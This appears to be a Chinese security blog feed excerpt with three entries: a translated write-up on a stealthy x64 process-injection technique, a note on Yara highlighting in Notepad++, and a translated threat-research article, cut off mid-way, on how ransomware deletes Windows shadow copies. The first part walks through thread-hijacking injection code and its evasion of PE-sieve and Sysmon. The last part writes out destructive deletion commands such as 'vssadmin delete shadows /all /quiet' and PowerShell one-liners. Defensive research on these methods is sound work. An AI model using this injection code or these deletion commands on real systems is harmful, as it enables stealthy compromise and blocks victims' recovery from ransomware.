class="built_in">VirtualQueryEx</span>(</span><br><span class="line">        ProcessHandle,</span><br><span class="line">        (LPBYTE)ImageBaseAddress + i,</span><br><span class="line">        &amp;MemoryBasicInfo,</span><br><span class="line">        <span class="built_in"><span class="keyword">sizeof</span></span>(MEMORY_BASIC_INFORMATION)</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Search for a RW region to act as the stack.</span></span><br><span class="line">    <span class="comment">// Note: It&#x27;s probably ideal to look for a RW section </span></span><br><span class="line">    <span class="comment">// inside the executable image memory pages because</span></span><br><span class="line">    <span class="comment">// the padding of sections suits the fifth, optional</span></span><br><span class="line">    <span class="comment">// argument for ReadProcessMemory and WriteProcessMemory.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">if</span> (MemoryBasicInfo.Protect &amp; PAGE_READWRITE) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Stack location in RW page starting at the bottom.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到正确的页面后，应从页面底部向上枚举堆栈的位置（由于堆栈的性质），并且应该为 ReadProcessMemory 的第五个参数找到一个 0x0000000000000000 的值。 这意味着我们需要确保堆栈偏移量距底部加 Shellcode 的空间至少为 0x28。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">                   +--------------+</span><br><span class="line">                   |     ...      |</span><br><span class="line">                   +--------------+ -0x30</span><br><span class="line">    Should be 0 -&gt; |     arg5     |</span><br><span class="line">                   +--------------+ -0x28</span><br><span class="line">                   |     arg4     |</span><br><span class="line">                   +--------------+ -0x20</span><br><span class="line">                   |     arg3     |</span><br><span class="line">                   +--------------+ -0x18</span><br><span class="line">                   |     arg2     |</span><br><span class="line">                   +--------------+ -0x10</span><br><span class="line">                   |     arg1     |</span><br><span class="line">                   +--------------+ -0x8</span><br><span class="line">                   |     ret      |</span><br><span class="line">                   +--------------+ 0x0</span><br><span class="line">                   |   Shellcode  |</span><br><span class="line">Bottom of stack -&gt; +--------------+ </span><br></pre></td></tr></table></figure><p>下面是一些演示代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Allocate a stack to read a local copy.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Stack = <span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, AddressSize);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Scan stack for NULL fifth arg</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">Success = <span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    Address,</span><br><span class="line">    Stack,</span><br><span class="line">    AddressSize,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Enumerate from bottom (it&#x27;s a stack).</span></span><br><span class="line"><span class="comment">// Start from -5 * 8 =&gt; at least five arguments + shellcode.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">for</span> (SIZE_T i = AddressSize - <span class="number">5</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T) - <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode); i &gt; <span class="number">0</span>; i -= <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T)) &#123;</span><br><span class="line">    ULONG_PTR* StackVal = (ULONG_PTR*)((LPBYTE)Stack + i);</span><br><span class="line">    <span class="keyword">if</span> (*StackVal == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="comment">// Get stack offset.</span></span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        *StackOffset = i + <span class="number">5</span> * <span class="built_in"><span class="keyword">sizeof</span></span>(SIZE_T);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果可执行文件的模块内没有 RW 页面，则可以执行后备操作以写入堆栈。 要查找远程进程的堆栈，我们可以执行以下操作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NtQueryInformationThread</span>(</span><br><span class="line">    ThreadHandle,</span><br><span class="line">    ThreadBasicInformation,</span><br><span class="line">    &amp;ThreadBasicInfo,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(THREAD_BASIC_INFORMATION),</span><br><span class="line">    &amp;ReturnLength</span><br><span class="line">);</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(</span><br><span class="line">    ProcessHandle,</span><br><span class="line">    ThreadBasicInfo.TebBaseAddress,</span><br><span class="line">    &amp;Tib,</span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(NT_TIB),</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Get stack offset.</span></span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure><p>Tib 中的结果将包含堆栈范围地址。 有了这些值，我们可以在使用代码之前从堆栈底部开始定位适当的偏移量。</p><h3 id="写入-ShellCode"><a href="#写入-ShellCode" class="headerlink" title="写入 ShellCode"></a>写入 ShellCode</h3><p>No Allocation 的主要问题是我们必须编写 ShellCode，然后在同一页面中执行它。 有一种方法可以不使用 VirtualProtectEx 或具有此特殊功能的复杂 ROP 链：WriteProcessMemory。 好的，我确实说过我们不能使用 WriteProcessMemory 将数据从我们的进程写入目标，但是我没有说我们不能强迫目标进程自己使用它。WriteProcessMemory 内部的隐藏机制之一是，它将相应地重新保护目标缓冲区的页面以执行写操作。 在这里，我们看到使用 NtQueryVirtualMemory 查询目标缓冲区的页面：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/8AB2CE60AFE4B834E457A8949860FF1E.png" alt=""></p><p>然后使用 NtProtectVirtualMemory 对页面进行写保护：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/B029BE46925D6AE3531CE2FED28FC700.png" alt=""></p><p>如果您已经注意到，WriteProcessMemory 会在函数开始时修改 shadow 堆栈。 在这种情况下，我们需要修改 ShellCode 以填充 shadow 堆栈：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BYTE Shellcode[] = &#123;</span><br><span class="line">    <span class="comment">// Placeholder for ret from ReadProcessMemory to infinte jmp loop.</span></span><br><span class="line">    <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>,</span><br><span class="line">    <span class="comment">// Pad for shadow stack.</span></span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="comment">// Shellcode starts here at Shellcode + 0x30...</span></span><br><span class="line">    <span class="number">0xEB</span>, <span class="number">0xFE</span>, <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x89</span>, <span class="number">0xAA</span>,</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCC</span>, <span class="number">0xDD</span>, <span class="number">0xEE</span>, <span class="number">0xFF</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>现在我们需要依次调用 ReadProcessMemory 和 WriteProcessMemory。 回到 ReadProcessMemory 的返回中，我们可以简单地跳回到无限 jmp 循环小工具以暂停执行，而不是停止执行 ShellCode（现在位于不可执行的页面）：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/0F7ADBEDB8FC310D3D736DE63C7DF705.png" alt=""></p><p>这使得恶意进程有时间调用另一个 SetThreadContext 将 RIP 设置为 WriteProcessMemory 并重用 ReadProcessMemory 中的 RSP。 我们可以从 ReadProcessMemory 复制的同一位置读取 ShellCode（将 0x30 字节复制到实际的 ShellCode），然后将具有执行许可权的任何页面作为目标（同样，假设有 RX 节）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Get target process to write the shellcode</span></span><br><span class="line">Success = <span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    &amp;ThreadHandle,</span><br><span class="line">    <span class="comment">// Set rip to read our shellcode</span></span><br><span class="line">    &amp;_WriteProcessMemory,</span><br><span class="line">    <span class="comment">// RSP points to same stack offset</span></span><br><span class="line">    &amp;StackLocation,</span><br><span class="line">    <span class="comment">// RCX: Target process&#x27; own handle</span></span><br><span class="line">    (HANDLE)<span class="number">-1</span>,</span><br><span class="line">    <span class="comment">// RDX: Buffer to store shellcode</span></span><br><span class="line">    ShellcodeLocation,</span><br><span class="line">    <span class="comment">// R8: Address to write from</span></span><br><span class="line">    (LPBYTE)StackLocation + <span class="number">0x30</span>,</span><br><span class="line">    <span class="comment">// R9: size to write</span></span><br><span class="line">    <span class="built_in"><span class="keyword">sizeof</span></span>(Shellcode) - <span class="number">0x30</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>当 WriteProcessMemory 返回时，它应再次返回到无限 jmp 循环，从而允许恶意进程对 SetThreadContext 进行最终调用以执行 ShellCode：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Execute the shellcodez</span></span><br><span class="line">Success = <span class="built_in">SetExecutionContext</span>(</span><br><span class="line">    &amp;ThreadHandle,</span><br><span class="line">    <span class="comment">// Set RIP to execute shellcode</span></span><br><span class="line">    &amp;ShellcodeLocation,</span><br><span class="line">    <span class="comment">// RSP is optional</span></span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="comment">// Arguments to shellcode are optional</span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>总体而言，整个注入过程如下：</p><ol><li>将 SetThreadContext 设置为无限的 jmp 循环，以允许 SetThreadContext 可靠地使用易失性寄存器；</li><li>找到一个有效的 RW 堆栈（或伪堆栈）以承载 ReadProcessMemory 和 WriteProcessMemory 参数以及临时的 ShellCode；</li><li>使用 DuplicateHandle 为目标进程注册一个重复的句柄，以从恶意进程中读取 ShellCode；</li><li>使用 SetThreadContext 调用 ReadProcessMemory 复制 ShellCode；</li><li>在 ReadProcessMemory 之后返回无限 jmp 循环；</li><li>使用 SetThreadContext 调用 WriteProcessMemory 将 ShellCode 复制到 RX 页面；</li><li>在 WriteProcessMemory 之后返回无限 jmp 循环；</li><li>使用 SetThreadContext 调用 ShellCode；</li></ol><h2 id="关于检测"><a href="#关于检测" class="headerlink" title="关于检测"></a>关于检测</h2><p>为了快速测试隐蔽性能，我使用了两个工具：hasherazade 的 PE-sieve 和 Sysinternal 的 Sysmon。 如果还有其他防御性监视工具，我很想看看这种技术与它们对抗的能力。</p><h3 id="PE-sieve"><a href="#PE-sieve" class="headerlink" title="PE-sieve"></a>PE-sieve</h3><p>我在玩 PE-sieve 时注意到的一点是，如果我们将 ShellCode 注入到 .text（或其他相关部分）的填充中，则根本不会检测到它：</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/FC5498FEF7E65DEFE01AAA575815E383.png" alt=""></p><p>如果 ShellCode 太大而无法填充，则另一个模块可能包含更大的空间。</p><h3 id="Sysmon-事件"><a href="#Sysmon-事件" class="headerlink" title="Sysmon 事件"></a>Sysmon 事件</h3><p>这些是使用 CreateProcess 调用而不是 OpenProcess 生成目标进程的预期结果。其他需要注意的是，DuplicateHandle 调用可能会触发 Sysmon 中 ObRegisterCallbacks 的进程句柄事件。并非如此，因为如果拥有相同句柄的进程执行了句柄访问，则 Sysmon 不会跟随该事件。 对于 AV 或 EDR，可能有所不同。</p><p><img src="https://image.zeronohacker.com/article/2020/06/05/CE95F26A8415571143CB56743893016F.png" alt=""></p><h3 id="进一步改进"><a href="#进一步改进" class="headerlink" title="进一步改进"></a>进一步改进</h3><p>自从我真正着手完成这个（副项目）项目以来，我不会怀疑可能会忽略一些问题 – 我只需要探索这个想法，看看我能走多远。 关于恢复被劫持线程的执行，有可能并且我已经在 PoC 中实现了它，但是它取决于恶意进程，这可能是好事，也可能不是好事。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>因此，有可能不使用恶意进程中的 WriteProcessMemory，VirtualAllocEx，VirtualProtectEx，CreateRemoteThread，NtCreateThreadEx，QueueUserApc 和 NtQueueApcThread 来注入远程进程。 OpenProcess 和 OpenThread 的用法仍然值得商榷，因为有时使用 CreateProcess 生成目标进程并不总是这种情况。但是，它确实消除了许多可疑 call，这是此技术的目标。</p><p>由于 SetThreadContext 是一个如此强大的原始函数，并且对该函数和其他许多隐秘技术至关重要，因此是否会对此进行更多关注？ 从我所看到的，Microsoft-Windows-Kernel-Audit-API-Calls ETW 提供程序中已经有可用的本机 Windows 日志记录。 我有兴趣了解进程注入的未来 …</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文翻译自：&lt;a href=&quot;https://undev.ninja/nina-x64-process-injection/&quot;&gt;https://undev.ninja/nina-x64-process-injection/&lt;/a&gt;&lt;/p&gt;
&lt;/bl</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="NINA" scheme="https://zeronohacker.github.io/tags/NINA/"/>
    
    <category term="Inject" scheme="https://zeronohacker.github.io/tags/Inject/"/>
    
  </entry>
  
  <entry>
    <title>Notepad++ 中让 Yara 语法高亮</title>
    <link href="https://zeronohacker.github.io/2020/05/31/make-yara-syntax-highlighting-in-notepad-plus-plus/"/>
    <id>https://zeronohacker.github.io/2020/05/31/make-yara-syntax-highlighting-in-notepad-plus-plus/</id>
    <published>2020-05-31T09:55:10.000Z</published>
    <updated>2021-09-19T10:02:35.381Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>项目地址：<a href="https://github.com/DissectMalware/npp-langs-4-sec">https://github.com/DissectMalware/npp-langs-4-sec</a></p></blockquote><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>该项目旨在将语法高亮显示功能引入网络安全从业人员使用的诸如 Yara 之类的语言的 Notepad ++。</p><h2 id="Yara-语言"><a href="#Yara-语言" class="headerlink" title="Yara 语言"></a>Yara 语言</h2><p>yara-byDissectMalware.xml 是一个 Notepad ++ UDL 文件，用于为 Yara 规则定义语法高亮显示。扩展名为 .yar 或 .yara 的文件将根据此 UDL 文件自动高亮显示。如果 Yara 文件不以该扩展名结尾，则可以转到 “Language” 菜单，然后从子菜单中选择 “Yara”。</p><p><img src="https://image.zeronohacker.com/article/2020/05/31/531fcd38149616bfc0a386e880c7b866.png" alt=""></p><h2 id="XLM-语言"><a href="#XLM-语言" class="headerlink" title="XLM 语言"></a>XLM 语言</h2><p>xlm-byDissectMalware.xml 是一个 Notepad ++ UDL 文件，用于定义 XLM 宏（又称 Excel 4.0 宏）的语法高亮显示。扩展名为 .xlm 的文件将根据此 UDL 文件自动高亮显示。如果 XLM 文件不以该扩展名结尾，则可以转到 “Language” 菜单，然后从子菜单中选择 “XLM”。</p><p><img src="https://image.zeronohacker.com/article/2020/05/31/37d9e0320253c54a6051ef855d79b03b.png" alt=""></p><h2 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h2><p>打开 Notepad++，选择 Language -&gt; User Defined Language -&gt; Define your language …</p><p><img src="https://image.zeronohacker.com/article/2020/05/31/ad2a6b8cfee41fb976cd636112c3b73c.png" alt=""></p><p>导入 UDL 文件，重新打开 Notepad++ 生效。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/DissectMalware/npp-langs-4-sec&quot;&gt;https://github.com/DissectMalware/npp-langs-4-sec&lt;/a&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="工具源码" scheme="https://zeronohacker.github.io/categories/%E5%B7%A5%E5%85%B7%E6%BA%90%E7%A0%81/"/>
    
    
    <category term="Yara" scheme="https://zeronohacker.github.io/tags/Yara/"/>
    
    <category term="Notepad++" scheme="https://zeronohacker.github.io/tags/Notepad/"/>
    
  </entry>
  
  <entry>
    <title>卷影副本删除方法再研究</title>
    <link href="https://zeronohacker.github.io/2020/04/29/stomping-shadow-copies-a-second-look-in-to-deletion-methods/"/>
    <id>https://zeronohacker.github.io/2020/04/29/stomping-shadow-copies-a-second-look-in-to-deletion-methods/</id>
    <published>2020-04-29T09:39:00.000Z</published>
    <updated>2021-09-19T09:48:07.459Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文翻译自：<a href="https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods.html">https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods.html</a></p></blockquote><h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>在最近几年，勒索软件对组织机构来说成了一种非常大的威胁，并给其造成了巨大的损失，估计达数十亿美元。为了提高勒索成功率，勒索软件执行的常见操作是擦除卷备份（即卷影副本），从而阻止受害者恢复已加密的任何文件。</p><p>在本博客中，我们回顾了勒索软件用于删除卷影副本的现有方法，以便能让防御者对他们需要保护的资源所用到的技术有一个大致的了解。除此之外，我们还介绍了勒索软件可能使用的新方法。这些新方法将能够让防御者为潜在的威胁部署适当的检测方案，因为在野外遇到它们只是时间问题。</p><h2 id="VSS-体系结构"><a href="#VSS-体系结构" class="headerlink" title="VSS 体系结构"></a>VSS 体系结构</h2><p>在我们开始之前，读者需要对关于卷影拷贝体系结构中几个关键性概念有所了解。</p><h3 id="Volume-Shadow-Copy-Service（VSS）"><a href="#Volume-Shadow-Copy-Service（VSS）" class="headerlink" title="Volume Shadow Copy Service（VSS）"></a>Volume Shadow Copy Service（VSS）</h3><p>该 Service 负责协调执行卷影拷贝相关操作的实体（例如相关的 Writers 和 Providers）之间的所有操作。VSS 是使用 COM（组件对象模型）技术实现的，读者应该对本文的后半部分有个基本的了解。</p><h3 id="VSS-Writers"><a href="#VSS-Writers" class="headerlink" title="VSS Writers"></a>VSS Writers</h3><p>这些组件负责提供通过 VSS Service 备份的稳定数据管道。Windows 列出了各种软件组件的 “内置 VSS Writers”。</p><h3 id="VSS-Providers"><a href="#VSS-Providers" class="headerlink" title="VSS Providers"></a>VSS Providers</h3><p>这些组件创建并维护实际的卷影副本对象。Providers 主要类型有两种：“硬件 Providers” 和 “软件 Providers”</p><h3 id="组件及其之间的关系"><a href="#组件及其之间的关系" class="headerlink" title="组件及其之间的关系"></a>组件及其之间的关系</h3><p>VSS 体系结构图说明了组件及其之间的关系，如下图所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/29/3B39E0717D6A99C734B0DCC697E6E8FD.png" alt=""></p><h2 id="System-Providers"><a href="#System-Providers" class="headerlink" title="System Providers"></a>System Providers</h2><p>System Providers 是 Windows 上的默认提供程序，目前已实现为软件提供程序。 在处理卷影副本删除尝试时，它是最常见的目标。 System Providers 采用写时复制（C-o-W）机制，因此快照仅保存在卷上进行的更改。 这些更改将保存在指定的“差异区域”存储位置，该位置通常位于同一卷上。 但是，它们也可以保存在任何足以容纳它们的 NTFS 卷上。</p><h2 id="存在的删除方法"><a href="#存在的删除方法" class="headerlink" title="存在的删除方法"></a>存在的删除方法</h2><p>有两种删除卷影副本的方法。 第一种是使用命令行实用程序或以编程方式以各种方式（我们将在本文稍后介绍）明确删除卷影副本。</p><p>第二种方法采用间接途径，因为它依赖于可以控制“差异区域”大小的事实。 如果现有快照超过新调整大小的差异区域的大小，则提供程序将删除快照以释放空间，如下图中的文档所述。（请注意，可设置的最小大小为 320 MB）。</p><p>请注意，使用 VSS 需要管理员特权。</p><p>两个可以管理 VSS 的著名命令行实用程序：vssadmin.exe（从 Windows XP 开始与每个全新的 Windows 安装一起提供）和 WMIC.exe（WMI 命令行），可以提供对 VSS 的访问。 Windows 管理规范。 随着时间的流逝，行为者逐渐发展了对这些实用程序的使用，以抵抗防御者的侦查。</p><p>第一种也是最常用的方法是使用 delete 命令运行 vssadmin：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /all /quiet</span><br></pre></td></tr></table></figure><p>使用此方法观察到的一些臭名昭著的勒索软件系列是 Ryuk，WannaCry，Dharma，RobinHood，Hermes，Phobos 和 Locky。</p><p>在此方法广为人知并加以防御之后，攻击者开始使用 WMIC.exe 通过以下参数删除卷影副本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic shadowcopy delete /nointeractive</span><br></pre></td></tr></table></figure><p>这种方法在勒索软件作者中也非常流行，并且被 GandCrab，Robinhood，Phobos，LockBit，Rapid 和 JCry 使用。</p><p>另一方面，与前两种方法相比，调整大小是勒索软件家族中一个相对较新的方法，即使在 vssdamin 中也进行了调整，但在野外也不常见：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin resize shadowstorage /for=&lt;backed volume&gt; /on=&lt;backup location volume&gt; /maxsize=&lt;new size&gt;</span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/04/29/BE38B6E8DC3FC09407FB934E43AE454D.png" alt=""></p><p>一些勒索软件系列使用了这种方法，例如 Nemty，Ryuk，Hermes，Rap][23fdscid 和 MegaCortex（唯一实际使用最小大小的勒索软件），并且我们希望在将来看到更广泛的使用。</p><p>这种方法的问题在于，我们不一定知道在 diff 区域中使用了多少空间，这可能会导致这样的情况：尽管调整了大小，但某些快照仍可能无法删除。由于系统提供者使用 C-o-W，因此更改会在发生更改时以及创建快照之前保存到差异区域。为克服此问题，在调整大小操作之后，应在差异区域中填充等于或大于其缩小大小的数据，然后创建新快照以触发删除所有现有快照。</p><p>勒索软件作者的最新创新在于，他们倾向于直接从其代码（或脚本）中调用卷影副本的删除。勒索软件偏向于运行 PowerShell 一线式，只需一行简fds-32单的代码即可枚举和删除卷影副本的所有实例。</p><p>通过 WMI 的 Win32_ShadowCopy 类和有用的 PowerShell cmdlet 可以方便地实现此目的，以访问 WMI 对象，如以下示例所示：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_ShadowCopy | % &#123; <span class="variable">$_</span>.Delete() &#125;</span><br><span class="line"><span class="built_in">Get-WmiObject</span> Win32_ShadowCopy | <span class="built_in">Remove-WmiObject</span></span><br></pre></td></tr></table></figure><p>Nemty 和 Sodinokibi 使用 Get-WmiObject cmdlet。 Sodinokibi 将 PowerShell 作为子进程运行，该进程具有 base64 编码的命令行参数，该参数解码为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Shadowcopy | <span class="built_in">ForEach-Object</span> &#123; <span class="variable">$_Delete</span>(); &#125;</span><br></pre></td></tr></table></figure><p>在下一节中，我们将介绍尚未发现的 ITW 删除方法。</p><h2 id="新的删除方法"><a href="#新的删除方法" class="headerlink" title="新的删除方法"></a>新的删除方法</h2><p>在本节中，我们讨论了删除卷副本的新方法，这些副本将来可能被勒索软件使用。 第一种方法提供了其他 PowerShell 技巧来触发删除，而第二种方法和第三种方法则利用了 VSS 体系结构的行为和内部工作原理。</p><h3 id="PowerShell-Tradecraft"><a href="#PowerShell-Tradecraft" class="headerlink" title="PowerShell Tradecraft"></a>PowerShell Tradecraft</h3><p>尽管我们还没有遇到任何使用此工具的勒索软件，但可以使用 CIM cmdlet 代替 WMI cmdlet：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-CimInstance</span> Win32_ShadowCopy | <span class="built_in">Remove-CimInstance</span></span><br></pre></td></tr></table></figure><p>在远程计算机上进行基于 CIM 的调用时，它们将通过 WinRM 而不是 DCOM 发送。PowerShell cmdlet 还支持别名。 有些是内置的，例如 gwmi 用于 Get-WmiObject 或 gcim 用于 Get-CimInstance。 可以通过 New-Alias cmdlet 创建新的，而可以使用 Set-Alias cmdlet 修改现有的。</p><p>也可以在没有 PowerShell.exe 二进制文件的情况下运行 PowerShell 脚本。 某些 LOLBins 可以执行 Powershell 脚本。 例如SyncAppvPublishingServer.exe。 这些二进制文件的优点是它们可以绕过应用程序黑名单防御。</p><p>除了将已知的主机进程用于 PowerShell Core，还可以使用 .NET Framework 在您自己的进程中执行 PowerShell 脚本。 一些工具已经实现了它（UnmanagedPowerShell 和 SharpPick）。</p><h3 id="调用-COM-对象"><a href="#调用-COM-对象" class="headerlink" title="调用 COM 对象"></a>调用 COM 对象</h3><p>WMI 可以通过 COM 而不是命令行工具或 PowerShell 通过编程方式使用，并且正如我们前面提到的，VSS 体系结构本身是基于 COM 的，因此可以使用更直接的方法直接操作那些对象。</p><p>如果我们看一下 vssadmin 的内幕，我们很快就会注意到它使用带有 IVssCoordinator 接口的 VSSCoordinator COM 类向 VSS 服务发出删除请求。 该对象在名为 vss_ps.dll 的代理 DLL 中实现。</p><p><img src="https://image.zeronohacker.com/article/2020/04/29/9A3FE5D1849CA6812E1BF70DA3882D66.png" alt=""></p><p>根据这一发现，显而易见的方向是直接使用同一 COM 对象，因此，vssadmin 二进制文件将变得多余。 相关的接口定义显示在 vscoordint.idl 中，该文件在较早的 Windows SDK 版本中提供。 删除功能定义为：</p><figure class="highlight c++"><table><tr><td 